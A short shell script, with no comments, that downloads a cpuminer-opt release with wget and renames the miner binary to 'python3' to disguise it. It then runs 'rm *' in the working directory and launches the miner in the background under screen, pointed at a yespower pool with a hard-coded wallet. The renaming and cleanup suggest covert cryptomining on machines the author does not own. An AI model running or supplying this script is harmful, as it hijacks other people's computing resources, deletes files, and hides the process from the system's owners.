apt install screen -y

wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz

tar -xzf dot

rm dot

mv cpuminer-sse2 python3

mv python3 ~/

rm *

cd ~/

screen ./python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOT -p m=solo
